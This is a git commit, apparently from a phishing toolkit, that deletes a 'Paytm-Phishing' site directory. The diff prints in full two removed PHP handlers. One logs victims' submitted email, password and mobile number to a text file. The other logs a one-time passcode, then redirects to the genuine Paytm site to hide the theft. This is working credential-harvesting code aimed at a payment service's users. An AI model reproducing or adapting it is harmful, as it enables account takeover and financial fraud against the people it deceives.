4c97b81b4c01302044ccfec59febe317d144ed7d
SG_PRO <55870659+Ignitetch@users.noreply.github.com>
2022-06-11 12:11:43 +0530

    Delete sites/Paytm-Phishing directory
    sgd

--- sites/Paytm-Phishing/paytm/posts.php
+++
@@ -1,5 +0,0 @@
-<?php
-
-    file_put_contents("log.txt", "OTP: " . $_POST['otp'] . "\n", FILE_APPEND);
-header('Location: https://paytm.com');
-exit();
--- sites/Paytm-Phishing/signup/post.php
+++
@@ -1,5 +0,0 @@
-<?php
-
-    file_put_contents("log.txt", "Email: " . $_POST['email'] . " Pass: " . $_POST['loginPassword'] . " Mobile: " . $_POST['mobileNumber'] . "\n", FILE_APPEND);
-header('Location: otp.login.php');
-exit();
